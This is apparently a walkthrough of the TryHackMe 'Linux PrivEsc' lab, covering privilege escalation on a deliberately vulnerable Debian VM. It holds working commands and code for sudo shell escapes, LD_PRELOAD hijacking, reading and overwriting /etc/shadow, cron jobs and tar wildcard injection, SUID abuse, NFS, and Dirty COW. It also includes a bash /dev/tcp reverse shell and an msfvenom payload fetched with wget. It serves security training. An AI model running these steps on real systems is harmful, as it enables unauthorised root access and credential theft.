# Linux PrivEsc

**Room Link:** [https://tryhackme.com/room/linuxprivesc](https://tryhackme.com/room/linuxprivesc)



## Deploy the Vulnerable Debian VM

**Kali**

```
ssh user@$VICTIM
Password: password321
```

## Service Exploits

**Victim**

```
cd /home/user/tools/mysql-udf
```

Compile the raptor\_udf2.c exploit code using the following commands

**Victim**

```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect to the MySQL service as the root user with a blank password

**Victim**

```
mysql -u root
```

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do\_system" using our compiled exploit.

**Victim - mysql**

```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission.

**Victim - mysql**

```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges.

**Victim**

```
/tmp/rootbash -p
whoami
```

<figure><img src="../../.gitbook/assets/image (3) (3).png" alt=""><figcaption></figcaption></figure>

## Weak File Permissions - Readable /etc/shadow

The /etc/shadow file contains user password hashes and is usually readable only by the root user. Note that the /etc/shadow file on the VM is world-readable.

**Victim**

```
ls -l /etc/shadow
```

View the contents of the /etc/shadow file.

**Victim**

```
cat /etc/shadow
```

<figure><img src="../../.gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali.

**Kali**

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<figure><img src="../../.gitbook/assets/image (1) (12).png" alt=""><figcaption></figcaption></figure>

## Weak File Permissions - Writable /etc/shadow

Note that the /etc/shadow file on the VM is world-writable

**Victim**

```
ls -l /etc/shadow
```

<figure><img src="../../.gitbook/assets/image (7) (4).png" alt=""><figcaption></figcaption></figure>

Generate a new password hash with a password of your choice.

**Victim**

```
mkpasswd -m sha-512 newpasswordhere
```

<figure><img src="../../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Comment out the old one and add our output as the hash.

**Victim**

```
vi /etc/shadow
```

<figure><img src="../../.gitbook/assets/image (14) (7).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
su root
Password: newpasswordhere
```

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

## Weak File Permissions - Writable /etc/passwd

The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there. Note that the /etc/passwd file is world-writable.

**Victim**

```
ls -l /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Generate a new password hash with a password of your choice.

**Victim**

```
openssl passwd newpasswordhere
```

<figure><img src="../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>

Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x"). Switch to the root user, using the new password

**Victim**

```
vi /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
su root
Password: newpasswordhere
```

<figure><img src="../../.gitbook/assets/image (10) (4).png" alt=""><figcaption></figcaption></figure>

## Sudo - Shell Escape Sequences

**Victim**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

### apache2

We can use apache2 to read files and crack hashes.

**Victim**

```
sudo apache2 -f /etc/shadow
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

### **nmap**

#### **Option 1**

**Victim**

```
sudo nmap --interactive
nmap> !sh
```

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

#### **Option 2**

**Victim**

```
echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

### ftp

**Victim**

```
sudo ftp
ftp> !/bin/sh
```

<figure><img src="../../.gitbook/assets/image (10) (6).png" alt=""><figcaption></figcaption></figure>

## **more**

Need to enter the second command while scrolling through the output.

**Victim**

```
TERM= sudo more /etc/profile
!/bin/sh
```

<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>

### **less**

#### **Option 1**

**Victim**

```
sudo less /etc/profile
!/bin/sh
```

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>

This option did not work on this box as when you click v it opens nano instead of vi or vim. If you can someone set the environment variables VISUAL and/or EDITOR, you could get this to work but it would be difficult.

#### **Option 2**

**Victim**

```
export VISUAL=vi
export EDITOR=vi
echo 'export EDITOR=vim' >> ~/.bash_profile
echo 'export VISUAL=vim' >> ~/.bash_profile
sudo less /etc/profile
v
:shell
```

#### **Option 3**

**Victim**

```
VISUAL="/bin/sh -c '/bin/sh'" sudo less /etc/profile
v
```

### **awk**

**Victim**

```
sudo awk 'BEGIN {system("/bin/bash")}'
```

### **man**

**Victim**

```
sudo man man 
!bash
```

### **VIM**

**Victim**

```
sudo vim -c ':!/bin/bash'
```

### **find**

**Victim**

```
sudo find / etc/passwd -exec /bin/bash \;
```

### **iftop**

**Victim**

```
iftop
!/bin/sh
```

## Sudo - Environment Variables

### preload.c - code

```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

### library\_path.c

```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

Sudo can be configured to inherit certain environment variables from the user's environment. Check which environment variables are inherited (look for the env\_keep options):

**Victim**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

**LD\_PRELOAD** and **LD\_LIBRARY\_PATH** are both inherited from the user's environment. LD\_PRELOAD loads a shared object before any others when a program is run. LD\_LIBRARY\_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c.

**Victim**

```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

**LD\_PRELOAD** and **LD\_LIBRARY\_PATH** are both inherited from the user's environment. LD\_PRELOAD loads a shared object before any others when a program is run. LD\_LIBRARY\_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c

**Victim**

```
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/ftp
```

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run ldd against the apache2 program file to see which shared libraries are used by the program.

**Victim**

```
ldd /usr/sbin/apache2
```

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library\_path.c.

**Victim**

```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

<figure><img src="../../.gitbook/assets/image (8) (8).png" alt=""><figcaption></figcaption></figure>

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library\_path.c.

**Victim**

<pre><code><strong>sudo LD_LIBRARY_PATH=/tmp apache2
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (4) (4).png" alt=""><figcaption></figcaption></figure>

## Cron Jobs - File Permissions

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

View the contents of the system-wide crontab.

**Victim**

```
cat /etc/crontab
```

<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

Locate the full path of the overwrite.sh file.

**Victim**

```
locate overwrite.sh
```

Note that the file is world-writable.

**Victim**

```
ls -l /usr/local/bin/overwrite.sh
```

Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box

#### overwrite.sh

```
#!/bin/bash
bash -i >& /dev/tcp/$KALI/4444 0>&1
```

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener. If it doesn't recheck the permissions of the file, is anything missing?

**Kali**

```
nc -nvlp 4444
```

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>







## Cron Jobs - PATH Environment Variable

View the contents of the system-wide crontab

**Victim**

```
cat /etc/crontab
```

Note that the PATH variable starts with /home/user which is our user's home directory. Create a file called overwrite.sh in your home directory with the following contents

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

#### overwrite.sh

```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that the file is executable

**Victim**

```
chmod +x /home/user/overwrite.sh
```

Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:

**Victim**

```
/tmp/rootbash -p
```

<figure><img src="../../.gitbook/assets/image (4) (3) (2).png" alt=""><figcaption></figcaption></figure>

## Cron Jobs - Wildcards

View the contents of the other cron job script

**Victim**

```
cat /usr/local/bin/compress.sh
```

<figure><img src="../../.gitbook/assets/image (10) (1) (2).png" alt=""><figcaption></figcaption></figure>

Note that the tar command is being run with a wildcard (\*) in your home directory.

Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

**Kali**

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f elf -o shell.elf
```

Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable.

**Kali**

```
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /home/user/
wget http://$KALI:81/shell.elf
chmod +x /home/user/shell.elf
```

Create these two files in /home/user

**Victim**

```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

<figure><img src="../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

When the tar command in the cron job runs, the wildcard (\*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

**Kali**

```
nc -nvlp 4444
```

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

## SUID / SGID Executables - Known Exploits

Find all the SUID/SGID executables on the Debian VM.

**Victim**

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. Exploit-DB, Google, and GitHub are good places to search!

A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at /home/user/tools/suid/exim/cve-2016-1531.sh.

Run the exploit script to gain a root shell:

**Victim**

```
/home/user/tools/suid/exim/cve-2016-1531.sh
```

<figure><img src="../../.gitbook/assets/image (9) (7).png" alt=""><figcaption></figcaption></figure>

## SUID / SGID Executables - Shared Object Injection

The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.

First, execute the file and note that currently it displays a progress bar before exiting.

**Victim**

```
/usr/local/bin/suid-so
```

Run strace on the file and search the output for open/access calls and for "no such file" errors.

**Victim**

```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.

Create the .config directory for the libcalc.so file.

**Victim**

```
mkdir /home/user/.config
```

Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it.

**Victim**

```
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.

**Victim**

```
/usr/local/bin/suid-so
```

<figure><img src="../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

## SUID / SGID Executables - Environment Variables

The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver.

**Victim**

```
/usr/local/bin/suid-env
```

<figure><img src="../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>

Run strings on the file to look for strings of printable characters.

**Victim**

```
strings /usr/local/bin/suid-env
```

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.

Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell.

**Victim**

```
gcc -o service /home/user/tools/suid/service.c
```

#### service.c

```
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```

Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell.

**Victim**

```
PATH=.:$PATH /usr/local/bin/suid-env
```





## SUID / SGID Executables - Abusing Shell Features (#1)

The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

Verify this with strings

**Victim**

```
strings /usr/local/bin/suid-env2
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048.

**Victim**

```
/bin/bash --version
```

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:

**Victim**

```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

Run the suid-env2 executable to gain a root shell.

**Victim**

```
/usr/local/bin/suid-env2
```

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

## SUID / SGID Executables - Abusing Shell Features (#2)

Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements. Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash.

**Victim**

```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges.

**Victim**

```
/tmp/rootbash -p
```

<figure><img src="../../.gitbook/assets/image (6) (8).png" alt=""><figcaption></figcaption></figure>

## Passwords & Keys - History Files

If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.

View the contents of all the hidden history files in the user's home directory.

**Victim**

```
cat ~/.*history | less
```

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!

Switch to the root user, using the password.

**Victim**

```
su root
```

## Passwords & Keys - Config Files

Config files often contain passwords in plaintext or other reversible formats.

List the contents of the user's home directory.

**Victim**

```
ls /home/user
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Note the presence of a myvpn.ovpn config file. View the contents of the file.

**Victim**

```
cat /home/user/myvpn.ovpn
```

The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials.

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>



## Passwords & Keys - SSH Keys

Sometimes users make backups of important files but fail to secure them with the correct permissions.

Look for hidden files & directories in the system root.

**Victim**

```
ls -la /
```

Note that there appears to be a hidden directory called .ssh. View the contents of the directory.

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Note that there is a world-readable file called root\_key. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.

Copy the key over to your Kali box (it's easier to just view the contents of the root\_key file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it.

**Victim**

```
ls -l /.ssh
```

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Use the key to login to the Debian VM as the root account (note that due to the age of the box, some additional settings are required when using SSH):

**Kali**

<pre><code><strong>chmod 600 root_key
</strong><strong>ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.99.76
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

## NFS

Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM.

**Victim**

```
cat /etc/exports
```

<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

Note that the /tmp share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root.

**Kali**

```
sudo su
```

Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly).

**Kali**

```
mkdir /tmp/nfs
mount -o rw,vers=3 $VICTIM:/tmp /tmp/nfs
```

Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash).

**Kali**

```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

Still using Kali's root user, make the file executable and set the SUID permission.

**Kali**

```
chmod +xs /tmp/nfs/shell.elf
```

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell.

**Victim**

```
/tmp/shell.elf
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

## Kernel Exploits

Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.

Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system.

**Victim**

```
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).

Compile the code and run it (note that it may take several minutes to complete).

**Victim**

```
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
```

Once the exploit completes, run /usr/bin/passwd to gain a root shell:

**Victim**

```
/usr/bin/passwd
```

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>



